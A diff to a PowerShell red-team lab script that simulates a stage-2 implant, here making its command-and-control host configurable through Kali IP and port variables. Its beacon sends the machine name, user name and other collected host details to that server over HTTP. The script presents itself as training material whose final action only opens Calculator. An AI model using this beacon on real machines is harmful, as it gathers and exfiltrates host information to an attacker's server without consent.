@@ -1,6 +1,10 @@
 # LAB PAYLOAD — Benign demo
 # Simulates a stage-2 implant: recon → beacon → "execute"
 # Only opens Calculator. No harm to the system.
+#
+# Set C2 to your Kali IP before running
+$C2 = if ($env:KALI_IP) { $env:KALI_IP } else { "KALI_IP_NOT_SET" }
+$C2Port = if ($env:KALI_PORT) { $env:KALI_PORT } else { "8080" }
 
 Write-Host "`n[PAYLOAD] Running on $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Yellow
 
@@ -19,7 +23,7 @@ $info.GetEnumerator() | ForEach-Object { Write-Host "  $($_.Key): $($_.Value)" }
 # Beacon
 try {
     $qs  = ($info.GetEnumerator() | ForEach-Object { "$($_.Key)=$([uri]::EscapeDataString($_.Value))" }) -join "&"
-    Invoke-WebRequest -Uri "http://192.168.11.149:8080/beacon?$qs" -UseBasicParsing -TimeoutSec 5 | Out-Null
+    Invoke-WebRequest -Uri "http://${C2}:${C2Port}/beacon?$qs" -UseBasicParsing -TimeoutSec 5 | Out-Null
     Write-Host "`n[BEACON] C2 contacted" -ForegroundColor Green
 } catch {
     Write-Host "`n[BEACON] C2 unreachable (start tools/http_server.py on Kali)" -ForegroundColor Yellow
